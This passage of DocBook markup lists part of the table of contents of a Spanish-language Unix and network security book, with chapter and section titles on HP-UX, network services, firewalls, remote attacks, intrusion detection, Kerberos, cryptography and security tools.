  url="#x1-17200011.6"  ></ulink>EL SISTEMA
DE PARCHEADO</tocentry> 
<tocentry role="sectionToc">11.7&#x00A0;<anchor 
   id="QQ2-1-192"  ></anchor><ulink 
  url="#x1-17300011.7"  ></ulink>EXTENSIONES DE LA SEGURIDAD: FILTROS IP</tocentry> 
<tocentry role="sectionToc">11.8&#x00A0;<anchor 
   id="QQ2-1-193"  ></anchor><ulink 
  url="#x1-17400011.8"  ></ulink>EL
SUBSISTEMA DE RED</tocentry> 
<tocentry role="chapterToc">12&#x00A0;<anchor 
   id="QQ2-1-194"  ></anchor><ulink 
  url="#x1-17500012"  ></ulink>HP-UX</tocentry> 
<tocentry role="sectionToc">12.1&#x00A0;<anchor 
   id="QQ2-1-195"  ></anchor><ulink 
  url="#x1-17600012.1"  ></ulink>INTRODUCCI&#x00F3;N</tocentry> 
<tocentry role="sectionToc">12.2&#x00A0;<anchor 
   id="QQ2-1-196"  ></anchor><ulink 
  url="#x1-17700012.2"  ></ulink>SEGURIDAD F&#x02CA;ISICA

EN PA&#x2013;RISC</tocentry> 
<tocentry role="sectionToc">12.3&#x00A0;<anchor 
   id="QQ2-1-197"  ></anchor><ulink 
  url="#x1-17800012.3"  ></ulink>USUARIOS Y ACCESOS AL SISTEMA</tocentry> 
<tocentry role="sectionToc">12.4&#x00A0;<anchor 
   id="QQ2-1-199"  ></anchor><ulink 
  url="#x1-17900012.4"  ></ulink>EL SISTEMA DE
PARCHEADO</tocentry> 
<tocentry role="sectionToc">12.5&#x00A0;<anchor 
   id="QQ2-1-200"  ></anchor><ulink 
  url="#x1-18000012.5"  ></ulink>EXTENSIONES DE LA SEGURIDAD</tocentry> 
<tocentry role="subsectionToc">12.5.1&#x00A0;<anchor 
   id="QQ2-1-201"  ></anchor><ulink 
  url="#x1-18100012.5.1"  ></ulink>PRODUCT DESCRIPTION
FILES</tocentry> 
<tocentry role="subsectionToc">12.5.2&#x00A0;<anchor 
   id="QQ2-1-202"  ></anchor><ulink 
  url="#x1-18200012.5.2"  ></ulink>inetd.sec(4)</tocentry> 
<tocentry role="sectionToc">12.6&#x00A0;<anchor 
   id="QQ2-1-203"  ></anchor><ulink 
  url="#x1-18300012.6"  ></ulink>El subsistema de red</tocentry> 
<tocentry role="sectionToc">12.7&#x00A0;<anchor 
   id="QQ2-1-204"  ></anchor><ulink 
  url="#x1-18400012.7"  ></ulink>El n&#x00FA;cleo de
HP-UX</tocentry> 
<tocentry role="partToc">IV&#x00A0;<anchor 
   id="QQ2-1-205"  ></anchor><ulink 
  url="#x1-185000IV"  ></ulink>Seguridad de la subred</tocentry> 
<tocentry role="chapterToc">13&#x00A0;<anchor 
   id="QQ2-1-206"  ></anchor><ulink 
  url="#x1-18600013"  ></ulink>El sistema de red</tocentry> 
<tocentry role="sectionToc">13.1&#x00A0;<anchor 
   id="QQ2-1-207"  ></anchor><ulink 
  url="#x1-18700013.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">13.2&#x00A0;<anchor 
   id="QQ2-1-208"  ></anchor><ulink 
  url="#x1-18800013.2"  ></ulink>Algunos
ficheros importantes</tocentry> 
<tocentry role="subsectionToc">13.2.1&#x00A0;<anchor 
   id="QQ2-1-209"  ></anchor><ulink 
  url="#x1-18900013.2.1"  ></ulink>El fichero /etc/hosts</tocentry> 
<tocentry role="subsectionToc">13.2.2&#x00A0;<anchor 
   id="QQ2-1-210"  ></anchor><ulink 
  url="#x1-19000013.2.2"  ></ulink>El archivo
/etc/ethers</tocentry> 
<tocentry role="subsectionToc">13.2.3&#x00A0;<anchor 
   id="QQ2-1-211"  ></anchor><ulink 
  url="#x1-19100013.2.3"  ></ulink>El fichero /etc/networks</tocentry> 
<tocentry role="subsectionToc">13.2.4&#x00A0;<anchor 
   id="QQ2-1-212"  ></anchor><ulink 
  url="#x1-19200013.2.4"  ></ulink>El fichero /etc/services</tocentry> 
<tocentry role="subsectionToc">13.2.5&#x00A0;<anchor 
   id="QQ2-1-213"  ></anchor><ulink 
  url="#x1-19300013.2.5"  ></ulink>El
fichero /etc/protocols</tocentry> 
<tocentry role="subsectionToc">13.2.6&#x00A0;<anchor 
   id="QQ2-1-214"  ></anchor><ulink 
  url="#x1-19400013.2.6"  ></ulink>El fichero /etc/hosts.equiv</tocentry> 
<tocentry role="subsectionToc">13.2.7&#x00A0;<anchor 
   id="QQ2-1-215"  ></anchor><ulink 
  url="#x1-19500013.2.7"  ></ulink>El
fichero .netrc</tocentry> 
<tocentry role="subsectionToc">13.2.8&#x00A0;<anchor 
   id="QQ2-1-216"  ></anchor><ulink 
  url="#x1-19600013.2.8"  ></ulink>El fichero /etc/inetd.conf</tocentry> 
<tocentry role="sectionToc">13.3&#x00A0;<anchor 
   id="QQ2-1-217"  ></anchor><ulink 
  url="#x1-19700013.3"  ></ulink>Algunas &#x00F3;rdenes
importantes</tocentry> 
<tocentry role="subsectionToc">13.3.1&#x00A0;<anchor 
   id="QQ2-1-218"  ></anchor><ulink 
  url="#x1-19800013.3.1"  ></ulink>La orden ifconfig</tocentry> 
<tocentry role="subsectionToc">13.3.2&#x00A0;<anchor 
   id="QQ2-1-219"  ></anchor><ulink 
  url="#x1-19900013.3.2"  ></ulink>La orden route</tocentry> 
<tocentry role="subsectionToc">13.3.3&#x00A0;<anchor 
   id="QQ2-1-220"  ></anchor><ulink 
  url="#x1-20000013.3.3"  ></ulink>La orden
netstat</tocentry> 
<tocentry role="subsectionToc">13.3.4&#x00A0;<anchor 
   id="QQ2-1-221"  ></anchor><ulink 
  url="#x1-20100013.3.4"  ></ulink>La orden ping</tocentry> 
<tocentry role="subsectionToc">13.3.5&#x00A0;<anchor 
   id="QQ2-1-222"  ></anchor><ulink 
  url="#x1-20200013.3.5"  ></ulink>La orden traceroute</tocentry> 
<tocentry role="sectionToc">13.4&#x00A0;<anchor 
   id="QQ2-1-223"  ></anchor><ulink 
  url="#x1-20300013.4"  ></ulink>Servicios</tocentry> 
<tocentry role="chapterToc">14&#x00A0;<anchor 
   id="QQ2-1-224"  ></anchor><ulink 
  url="#x1-20400014"  ></ulink>Algunos
servicios y protocolos</tocentry> 
<tocentry role="sectionToc">14.1&#x00A0;<anchor 
   id="QQ2-1-225"  ></anchor><ulink 
  url="#x1-20500014.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">14.2&#x00A0;<anchor 
   id="QQ2-1-226"  ></anchor><ulink 
  url="#x1-20600014.2"  ></ulink>Servicios b&#x00E1;sicos de
red</tocentry> 
<tocentry role="subsectionToc">14.2.1&#x00A0;<anchor 
   id="QQ2-1-227"  ></anchor><ulink 
  url="#x1-20700014.2.1"  ></ulink>systat</tocentry> 
<tocentry role="subsectionToc">14.2.2&#x00A0;<anchor 
   id="QQ2-1-228"  ></anchor><ulink 
  url="#x1-20800014.2.2"  ></ulink>daytime</tocentry> 
<tocentry role="subsectionToc">14.2.3&#x00A0;<anchor 
   id="QQ2-1-229"  ></anchor><ulink 
  url="#x1-20900014.2.3"  ></ulink>netstat</tocentry> 
<tocentry role="subsectionToc">14.2.4&#x00A0;<anchor 
   id="QQ2-1-230"  ></anchor><ulink 
  url="#x1-21000014.2.4"  ></ulink>chargen</tocentry> 
<tocentry role="subsectionToc">14.2.5&#x00A0;<anchor 
   id="QQ2-1-231"  ></anchor><ulink 
  url="#x1-21100014.2.5"  ></ulink>tftp</tocentry> 
<tocentry role="subsectionToc">14.2.6&#x00A0;<anchor 
   id="QQ2-1-232"  ></anchor><ulink 
  url="#x1-21200014.2.6"  ></ulink>finger</tocentry> 
<tocentry role="subsectionToc">14.2.7&#x00A0;<anchor 
   id="QQ2-1-233"  ></anchor><ulink 
  url="#x1-21300014.2.7"  ></ulink>POP</tocentry> 
<tocentry role="subsectionToc">14.2.8&#x00A0;<anchor 
   id="QQ2-1-234"  ></anchor><ulink 
  url="#x1-21400014.2.8"  ></ulink>auth</tocentry> 
<tocentry role="subsectionToc">14.2.9&#x00A0;<anchor 
   id="QQ2-1-235"  ></anchor><ulink 
  url="#x1-21500014.2.9"  ></ulink>NNTP</tocentry> 
<tocentry role="subsectionToc">14.2.10&#x00A0;<anchor 
   id="QQ2-1-236"  ></anchor><ulink 
  url="#x1-21600014.2.10"  ></ulink>NTP</tocentry> 
<tocentry role="subsectionToc">14.2.11&#x00A0;<anchor 
   id="QQ2-1-237"  ></anchor><ulink 
  url="#x1-21700014.2.11"  ></ulink>UUCP</tocentry> 
<tocentry role="sectionToc">14.3&#x00A0;<anchor 
   id="QQ2-1-238"  ></anchor><ulink 
  url="#x1-21800014.3"  ></ulink>El
servicio FTP</tocentry> 
<tocentry role="subsectionToc">14.3.1&#x00A0;<anchor 
   id="QQ2-1-239"  ></anchor><ulink 
  url="#x1-21900014.3.1"  ></ulink>FTP an&#x00F3;nimo</tocentry> 
<tocentry role="subsectionToc">14.3.2&#x00A0;<anchor 
   id="QQ2-1-240"  ></anchor><ulink 
  url="#x1-22000014.3.2"  ></ulink>FTP invitado</tocentry> 
<tocentry role="sectionToc">14.4&#x00A0;<anchor 
   id="QQ2-1-241"  ></anchor><ulink 
  url="#x1-22100014.4"  ></ulink>El servicio
TELNET</tocentry> 
<tocentry role="sectionToc">14.5&#x00A0;<anchor 
   id="QQ2-1-242"  ></anchor><ulink 
  url="#x1-22200014.5"  ></ulink>El servicio SMTP</tocentry> 
<tocentry role="sectionToc">14.6&#x00A0;<anchor 
   id="QQ2-1-243"  ></anchor><ulink 
  url="#x1-22300014.6"  ></ulink>Servidores WWW</tocentry> 
<tocentry role="sectionToc">14.7&#x00A0;<anchor 
   id="QQ2-1-244"  ></anchor><ulink 
  url="#x1-22400014.7"  ></ulink>Los servicios
r-<informalequation><graphic 
fileref="unixsec0x.gif"></graphic></informalequation></tocentry> 
<tocentry role="sectionToc">14.8&#x00A0;<anchor 
   id="QQ2-1-245"  ></anchor><ulink 
  url="#x1-22500014.8"  ></ulink>XWindow</tocentry> 
<tocentry role="subsectionToc">14.8.1&#x00A0;<anchor 
   id="QQ2-1-246"  ></anchor><ulink 
  url="#x1-22600014.8.1"  ></ulink>Autenticaci&#x00F3;n por m&#x00E1;quina</tocentry> 
<tocentry role="subsectionToc">14.8.2&#x00A0;<anchor 
   id="QQ2-1-247"  ></anchor><ulink 
  url="#x1-22700014.8.2"  ></ulink>Autenticaci&#x00F3;n por
testigo</tocentry> 
<tocentry role="chapterToc">15&#x00A0;<anchor 
   id="QQ2-1-248"  ></anchor><ulink 
  url="#x1-22800015"  ></ulink>Cortafuegos: Conceptos te&#x00F3;ricos</tocentry> 
<tocentry role="sectionToc">15.1&#x00A0;<anchor 
   id="QQ2-1-249"  ></anchor><ulink 
  url="#x1-22900015.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">15.2&#x00A0;<anchor 
   id="QQ2-1-251"  ></anchor><ulink 
  url="#x1-23000015.2"  ></ulink>Caracter&#x02CA;&#x0131;sticas
de dise~no</tocentry> 
<tocentry role="sectionToc">15.3&#x00A0;<anchor 
   id="QQ2-1-252"  ></anchor><ulink 
  url="#x1-23100015.3"  ></ulink>Componentes de un cortafuegos</tocentry> 
<tocentry role="subsectionToc">15.3.1&#x00A0;<anchor 
   id="QQ2-1-253"  ></anchor><ulink 
  url="#x1-23200015.3.1"  ></ulink>Filtrado de paquetes</tocentry> 
<tocentry role="subsectionToc">15.3.2&#x00A0;<anchor 
   id="QQ2-1-254"  ></anchor><ulink 
  url="#x1-23300015.3.2"  ></ulink>Proxy
de aplicaci&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">15.3.3&#x00A0;<anchor 
   id="QQ2-1-255"  ></anchor><ulink 
  url="#x1-23400015.3.3"  ></ulink>Monitorizaci&#x00F3;n de la actividad</tocentry> 
<tocentry role="sectionToc">15.4&#x00A0;<anchor 
   id="QQ2-1-256"  ></anchor><ulink 
  url="#x1-23500015.4"  ></ulink>Arquitecturas de
cortafuegos</tocentry> 
<tocentry role="subsectionToc">15.4.1&#x00A0;<anchor 
   id="QQ2-1-257"  ></anchor><ulink 
  url="#x1-23600015.4.1"  ></ulink>Cortafuegos de filtrado de paquetes</tocentry> 
<tocentry role="subsectionToc">15.4.2&#x00A0;<anchor 
   id="QQ2-1-258"  ></anchor><ulink 
  url="#x1-23700015.4.2"  ></ulink>Dual-Homed
Host</tocentry> 
<tocentry role="subsectionToc">15.4.3&#x00A0;<anchor 
   id="QQ2-1-259"  ></anchor><ulink 
  url="#x1-23800015.4.3"  ></ulink>Screened Host</tocentry> 
<tocentry role="subsectionToc">15.4.4&#x00A0;<anchor 
   id="QQ2-1-260"  ></anchor><ulink 
  url="#x1-23900015.4.4"  ></ulink>Screened Subnet (DMZ)</tocentry> 
<tocentry role="subsectionToc">15.4.5&#x00A0;<anchor 
   id="QQ2-1-262"  ></anchor><ulink 
  url="#x1-24000015.4.5"  ></ulink>Otras
arquitecturas</tocentry> 
<tocentry role="chapterToc">16&#x00A0;<anchor 
   id="QQ2-1-263"  ></anchor><ulink 
  url="#x1-24100016"  ></ulink>Cortafuegos: Casos de estudio</tocentry> 
<tocentry role="sectionToc">16.1&#x00A0;<anchor 
   id="QQ2-1-264"  ></anchor><ulink 
  url="#x1-24200016.1"  ></ulink>Firewall-1</tocentry> 
<tocentry role="subsectionToc">16.1.1&#x00A0;<anchor 
   id="QQ2-1-265"  ></anchor><ulink 
  url="#x1-24300016.1.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">16.1.2&#x00A0;<anchor 
   id="QQ2-1-267"  ></anchor><ulink 
  url="#x1-24400016.1.2"  ></ulink>Arquitectura</tocentry> 
<tocentry role="subsectionToc">16.1.3&#x00A0;<anchor 
   id="QQ2-1-268"  ></anchor><ulink 
  url="#x1-24500016.1.3"  ></ulink>Instalaci&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">16.1.4&#x00A0;<anchor 
   id="QQ2-1-269"  ></anchor><ulink 
  url="#x1-24600016.1.4"  ></ulink>Gesti&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">16.1.5&#x00A0;<anchor 
   id="QQ2-1-271"  ></anchor><ulink 
  url="#x1-24700016.1.5"  ></ulink>El
sistema de log</tocentry> 
<tocentry role="subsectionToc">16.1.6&#x00A0;<anchor 
   id="QQ2-1-272"  ></anchor><ulink 
  url="#x1-24800016.1.6"  ></ulink>INSPECT</tocentry> 
<tocentry role="sectionToc">16.2&#x00A0;<anchor 
   id="QQ2-1-273"  ></anchor><ulink 
  url="#x1-24900016.2"  ></ulink>ipfwadm/ipchains/iptables</tocentry> 
<tocentry role="subsectionToc">16.2.1&#x00A0;<anchor 
   id="QQ2-1-274"  ></anchor><ulink 
  url="#x1-25000016.2.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">16.2.2&#x00A0;<anchor 
   id="QQ2-1-275"  ></anchor><ulink 
  url="#x1-25100016.2.2"  ></ulink>Arquitectura</tocentry> 
<tocentry role="subsectionToc">16.2.3&#x00A0;<anchor 
   id="QQ2-1-276"  ></anchor><ulink 
  url="#x1-25200016.2.3"  ></ulink>Gesti&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">16.2.4&#x00A0;<anchor 
   id="QQ2-1-277"  ></anchor><ulink 
  url="#x1-25300016.2.4"  ></ulink>El
sistema de log</tocentry> 
<tocentry role="sectionToc">16.3&#x00A0;<anchor 
   id="QQ2-1-278"  ></anchor><ulink 
  url="#x1-25400016.3"  ></ulink>IPFilter</tocentry> 
<tocentry role="subsectionToc">16.3.1&#x00A0;<anchor 
   id="QQ2-1-279"  ></anchor><ulink 
  url="#x1-25500016.3.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">16.3.2&#x00A0;<anchor 
   id="QQ2-1-280"  ></anchor><ulink 
  url="#x1-25600016.3.2"  ></ulink>Instalaci&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">16.3.3&#x00A0;<anchor 
   id="QQ2-1-281"  ></anchor><ulink 
  url="#x1-25700016.3.3"  ></ulink>Gesti&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">16.3.4&#x00A0;<anchor 
   id="QQ2-1-282"  ></anchor><ulink 
  url="#x1-25800016.3.4"  ></ulink>El
sistema de log</tocentry> 
<tocentry role="sectionToc">16.4&#x00A0;<anchor 
   id="QQ2-1-283"  ></anchor><ulink 
  url="#x1-25900016.4"  ></ulink>PIX Firewall</tocentry> 
<tocentry role="subsectionToc">16.4.1&#x00A0;<anchor 
   id="QQ2-1-284"  ></anchor><ulink 
  url="#x1-26000016.4.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">16.4.2&#x00A0;<anchor 
   id="QQ2-1-285"  ></anchor><ulink 
  url="#x1-26100016.4.2"  ></ulink>La primera sesi&#x00F3;n con
PIX Firewall</tocentry> 
<tocentry role="subsectionToc">16.4.3&#x00A0;<anchor 
   id="QQ2-1-286"  ></anchor><ulink 
  url="#x1-26200016.4.3"  ></ulink>Interfaces de red</tocentry> 
<tocentry role="subsectionToc">16.4.4&#x00A0;<anchor 
   id="QQ2-1-287"  ></anchor><ulink 
  url="#x1-26300016.4.4"  ></ulink>Accesos entre interfaces</tocentry> 
<tocentry role="subsectionToc">16.4.5&#x00A0;<anchor 
   id="QQ2-1-288"  ></anchor><ulink 
  url="#x1-26400016.4.5"  ></ulink>Listas
de control de acceso</tocentry> 
<tocentry role="subsectionToc">16.4.6&#x00A0;<anchor 
   id="QQ2-1-289"  ></anchor><ulink 
  url="#x1-26500016.4.6"  ></ulink>Rutado</tocentry> 
<tocentry role="subsectionToc">16.4.7&#x00A0;<anchor 
   id="QQ2-1-290"  ></anchor><ulink 
  url="#x1-26600016.4.7"  ></ulink>Otras &#x00F3;rdenes &#x00FA;tiles</tocentry> 
<tocentry role="subsectionToc">16.4.8&#x00A0;<anchor 
   id="QQ2-1-294"  ></anchor><ulink 
  url="#x1-27000016.4.8"  ></ulink>El sistema de log
remoto</tocentry> 
<tocentry role="subsectionToc">16.4.9&#x00A0;<anchor 
   id="QQ2-1-295"  ></anchor><ulink 
  url="#x1-27100016.4.9"  ></ulink>Failover</tocentry> 
<tocentry role="chapterToc">17&#x00A0;<anchor 
   id="QQ2-1-296"  ></anchor><ulink 
  url="#x1-27200017"  ></ulink>Ataques remotos</tocentry> 
<tocentry role="sectionToc">17.1&#x00A0;<anchor 
   id="QQ2-1-297"  ></anchor><ulink 
  url="#x1-27300017.1"  ></ulink>Escaneos de puertos</tocentry> 
<tocentry role="sectionToc">17.2&#x00A0;<anchor 
   id="QQ2-1-298"  ></anchor><ulink 
  url="#x1-27400017.2"  ></ulink>Spoo&#xFB01;ng</tocentry> 
<tocentry role="sectionToc">17.3&#x00A0;<anchor 
   id="QQ2-1-299"  ></anchor><ulink 
  url="#x1-27500017.3"  ></ulink>Negaciones
de servicio</tocentry> 
<tocentry role="sectionToc">17.4&#x00A0;<anchor 
   id="QQ2-1-300"  ></anchor><ulink 
  url="#x1-27600017.4"  ></ulink>Interceptaci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">17.5&#x00A0;<anchor 
   id="QQ2-1-301"  ></anchor><ulink 
  url="#x1-27700017.5"  ></ulink>Ataques a aplicaciones</tocentry> 
<tocentry role="subsectionToc">17.5.1&#x00A0;<anchor 
   id="QQ2-1-302"  ></anchor><ulink 
  url="#x1-27800017.5.1"  ></ulink>Correo electr&#x00F3;nico</tocentry> 
<tocentry role="subsectionToc">17.5.2&#x00A0;<anchor 
   id="QQ2-1-303"  ></anchor><ulink 
  url="#x1-27900017.5.2"  ></ulink>Ataques
v&#x02CA;&#x0131;a web</tocentry> 
<tocentry role="chapterToc">18&#x00A0;<anchor 
   id="QQ2-1-304"  ></anchor><ulink 
  url="#x1-28000018"  ></ulink>Sistemas de detecci&#x00F3;n de intrusos</tocentry> 
<tocentry role="sectionToc">18.1&#x00A0;<anchor 
   id="QQ2-1-305"  ></anchor><ulink 
  url="#x1-28100018.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">18.2&#x00A0;<anchor 
   id="QQ2-1-306"  ></anchor><ulink 
  url="#x1-28200018.2"  ></ulink>Clasi&#xFB01;caci&#x00F3;n de los
IDSes</tocentry> 
<tocentry role="sectionToc">18.3&#x00A0;<anchor 
   id="QQ2-1-307"  ></anchor><ulink 
  url="#x1-28300018.3"  ></ulink>Requisitos de un IDS</tocentry> 
<tocentry role="sectionToc">18.4&#x00A0;<anchor 
   id="QQ2-1-308"  ></anchor><ulink 
  url="#x1-28400018.4"  ></ulink>IDSes basados en m&#x00E1;quina</tocentry> 
<tocentry role="sectionToc">18.5&#x00A0;<anchor 
   id="QQ2-1-309"  ></anchor><ulink 
  url="#x1-28500018.5"  ></ulink>IDSes basados en
red</tocentry> 
<tocentry role="sectionToc">18.6&#x00A0;<anchor 
   id="QQ2-1-310"  ></anchor><ulink 
  url="#x1-28600018.6"  ></ulink>Detecci&#x00F3;n de anomal&#x02CA;&#x0131;as</tocentry> 
<tocentry role="sectionToc">18.7&#x00A0;<anchor 
   id="QQ2-1-311"  ></anchor><ulink 
  url="#x1-28700018.7"  ></ulink>Detecci&#x00F3;n de usos indebidos</tocentry> 
<tocentry role="sectionToc">18.8&#x00A0;<anchor 
   id="QQ2-1-312"  ></anchor><ulink 
  url="#x1-28800018.8"  ></ulink>Implementaci&#x00F3;n
real de un IDS</tocentry> 
<tocentry role="subsectionToc">18.8.1&#x00A0;<anchor 
   id="QQ2-1-314"  ></anchor><ulink 
  url="#x1-28900018.8.1"  ></ulink>IDS en el cortafuegos</tocentry> 
<tocentry role="subsectionToc">18.8.2&#x00A0;<anchor 
   id="QQ2-1-316"  ></anchor><ulink 
  url="#x1-29000018.8.2"  ></ulink>IDS en la red: SNORT</tocentry> 
<tocentry role="subsectionToc">18.8.3&#x00A0;<anchor 
   id="QQ2-1-318"  ></anchor><ulink 
  url="#x1-29100018.8.3"  ></ulink>IDS en
la m&#x00E1;quina</tocentry> 
<tocentry role="subsectionToc">18.8.4&#x00A0;<anchor 
   id="QQ2-1-319"  ></anchor><ulink 
  url="#x1-29200018.8.4"  ></ulink>Estrategias de respuesta</tocentry> 
<tocentry role="subsectionToc">18.8.5&#x00A0;<anchor 
   id="QQ2-1-320"  ></anchor><ulink 
  url="#x1-29300018.8.5"  ></ulink>Ampliaci&#x00F3;n del esquema</tocentry> 
<tocentry role="sectionToc">18.9&#x00A0;<anchor 
   id="QQ2-1-321"  ></anchor><ulink 
  url="#x1-29400018.9"  ></ulink>Algunas
re&#xFB02;exiones</tocentry> 
<tocentry role="chapterToc">19&#x00A0;<anchor 
   id="QQ2-1-322"  ></anchor><ulink 
  url="#x1-29500019"  ></ulink>Kerberos</tocentry> 
<tocentry role="sectionToc">19.1&#x00A0;<anchor 
   id="QQ2-1-323"  ></anchor><ulink 
  url="#x1-29600019.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">19.2&#x00A0;<anchor 
   id="QQ2-1-324"  ></anchor><ulink 
  url="#x1-29700019.2"  ></ulink>Arquitectura de Kerberos</tocentry> 
<tocentry role="sectionToc">19.3&#x00A0;<anchor 
   id="QQ2-1-325"  ></anchor><ulink 
  url="#x1-29800019.3"  ></ulink>Autenticaci&#x00F3;n</tocentry> 
<tocentry role="subsectionToc">19.3.1&#x00A0;<anchor 
   id="QQ2-1-327"  ></anchor><ulink 
  url="#x1-29900019.3.1"  ></ulink>Login</tocentry> 
<tocentry role="subsectionToc">19.3.2&#x00A0;<anchor 
   id="QQ2-1-328"  ></anchor><ulink 
  url="#x1-30000019.3.2"  ></ulink>Obtenci&#x00F3;n
de tickets</tocentry> 
<tocentry role="subsectionToc">19.3.3&#x00A0;<anchor 
   id="QQ2-1-329"  ></anchor><ulink 
  url="#x1-30100019.3.3"  ></ulink>Petici&#x00F3;n de servicio</tocentry> 
<tocentry role="sectionToc">19.4&#x00A0;<anchor 
   id="QQ2-1-331"  ></anchor><ulink 
  url="#x1-30200019.4"  ></ulink>Problemas de Kerberos</tocentry> 
<tocentry role="partToc">V&#x00A0;<anchor 
   id="QQ2-1-332"  ></anchor><ulink 
  url="#x1-303000V"  ></ulink>Otros aspectos de
la seguridad</tocentry> 
<tocentry role="chapterToc">20&#x00A0;<anchor 
   id="QQ2-1-333"  ></anchor><ulink 
  url="#x1-30400020"  ></ulink>Criptolog&#x02CA;&#x0131;a</tocentry> 
<tocentry role="sectionToc">20.1&#x00A0;<anchor 
   id="QQ2-1-334"  ></anchor><ulink 
  url="#x1-30500020.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">20.2&#x00A0;<anchor 
   id="QQ2-1-335"  ></anchor><ulink 
  url="#x1-30600020.2"  ></ulink>Criptosistemas</tocentry> 
<tocentry role="sectionToc">20.3&#x00A0;<anchor 
   id="QQ2-1-337"  ></anchor><ulink 
  url="#x1-30700020.3"  ></ulink>Clasi&#xFB01;caci&#x00F3;n
de los criptosistemas</tocentry> 
<tocentry role="subsectionToc">20.3.1&#x00A0;<anchor 
   id="QQ2-1-338"  ></anchor><ulink 
  url="#x1-30800020.3.1"  ></ulink>Criptosistemas de clave secreta</tocentry> 
<tocentry role="subsectionToc">20.3.2&#x00A0;<anchor 
   id="QQ2-1-339"  ></anchor><ulink 
  url="#x1-30900020.3.2"  ></ulink>Criptosistemas
de clave p&#x00FA;blica</tocentry> 
<tocentry role="sectionToc">20.4&#x00A0;<anchor 
   id="QQ2-1-340"  ></anchor><ulink 
  url="#x1-31000020.4"  ></ulink>Criptoan&#x00E1;lisis</tocentry> 
<tocentry role="sectionToc">20.5&#x00A0;<anchor 
   id="QQ2-1-341"  ></anchor><ulink 
  url="#x1-31100020.5"  ></ulink>Criptograf&#x02CA;&#x0131;a cl&#x00E1;sica</tocentry> 
<tocentry role="subsectionToc">20.5.1&#x00A0;<anchor 
   id="QQ2-1-342"  ></anchor><ulink 
  url="#x1-31200020.5.1"  ></ulink>El sistema
Caesar</tocentry> 
<tocentry role="subsectionToc">20.5.2&#x00A0;<anchor 
   id="QQ2-1-343"  ></anchor><ulink 
  url="#x1-31300020.5.2"  ></ulink>El criptosistema de Vig&#x00E8;nere</tocentry> 
<tocentry role="sectionToc">20.6&#x00A0;<anchor 
   id="QQ2-1-345"  ></anchor><ulink 
  url="#x1-31400020.6"  ></ulink>Un criptosistema de clave secreta:
DES</tocentry> 
<tocentry role="sectionToc">20.7&#x00A0;<anchor 
   id="QQ2-1-346"  ></anchor><ulink 
  url="#x1-31500020.7"  ></ulink>Criptosistemas de clave p&#x00FA;blica</tocentry> 
<tocentry role="subsectionToc">20.7.1&#x00A0;<anchor 
   id="QQ2-1-347"  ></anchor><ulink 
  url="#x1-31600020.7.1"  ></ulink>El criptosistema RSA</tocentry> 
<tocentry role="subsectionToc">20.7.2&#x00A0;<anchor 
   id="QQ2-1-348"  ></anchor><ulink 
  url="#x1-31700020.7.2"  ></ulink>El
criptosistema de ElGamal</tocentry> 
<tocentry role="subsectionToc">20.7.3&#x00A0;<anchor 
   id="QQ2-1-349"  ></anchor><ulink 
  url="#x1-31800020.7.3"  ></ulink>Criptosistema de McEliece</tocentry> 
<tocentry role="sectionToc">20.8&#x00A0;<anchor 
   id="QQ2-1-350"  ></anchor><ulink 
  url="#x1-31900020.8"  ></ulink>Funciones
resumen</tocentry> 
<tocentry role="sectionToc">20.9&#x00A0;<anchor 
   id="QQ2-1-351"  ></anchor><ulink 
  url="#x1-32000020.9"  ></ulink>Esteganograf&#x02CA;&#x0131;a</tocentry> 
<tocentry role="chapterToc">21&#x00A0;<anchor 
   id="QQ2-1-352"  ></anchor><ulink 
  url="#x1-32100021"  ></ulink>Algunas herramientas de seguridad</tocentry> 
<tocentry role="sectionToc">21.1&#x00A0;<anchor 
   id="QQ2-1-353"  ></anchor><ulink 
  url="#x1-32200021.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">21.2&#x00A0;<anchor 
   id="QQ2-1-354"  ></anchor><ulink 
  url="#x1-32300021.2"  ></ulink>Titan</tocentry> 
<tocentry role="sectionToc">21.3&#x00A0;<anchor 
   id="QQ2-1-357"  ></anchor><ulink 
  url="#x1-32600021.3"  ></ulink>TCP
Wrappers</tocentry> 
<tocentry role="sectionToc">21.4&#x00A0;<anchor 
   id="QQ2-1-358"  ></anchor><ulink 
  url="#x1-32700021.4"  ></ulink>SSH</tocentry> 
<tocentry role="sectionToc">21.5&#x00A0;<anchor 
   id="QQ2-1-359"  ></anchor><ulink 
  url="#x1-32800021.5"  ></ulink>Tripwire</tocentry> 
<tocentry role="sectionToc">21.6&#x00A0;<anchor 
   id="QQ2-1-360"  ></anchor><ulink 
  url="#x1-32900021.6"  ></ulink>Nessus</tocentry> 
<tocentry role="sectionToc">21.7&#x00A0;<anchor 
   id="QQ2-1-362"  ></anchor><ulink 
  url="#x1-33000021.7"  ></ulink>Crack</tocentry> 
<tocentry role="chapterToc">22&#x00A0;<anchor 
   id="QQ2-1-363"  ></anchor><ulink 
  url="#x1-33100022"  ></ulink>Gesti&#x00F3;n de la seguridad</tocentry> 
<tocentry role="sectionToc">22.1&#x00A0;<anchor 
   id="QQ2-1-364"  ></anchor><ulink 
  url="#x1-33200022.1"  ></ulink>Introducci&#x00F3;n</tocentry> 
<tocentry role="sectionToc">22.2&#x00A0;<anchor 
   id="QQ2-1-365"  ></anchor><ulink 
  url="#x1-33300022.2"  ></ulink>Pol&#x02CA;&#x0131;ticas
de seguridad</tocentry> 
<tocentry role="sectionToc">22.3&#x00A0;<anchor 
   id="QQ2-1-366"  ></anchor><ulink 
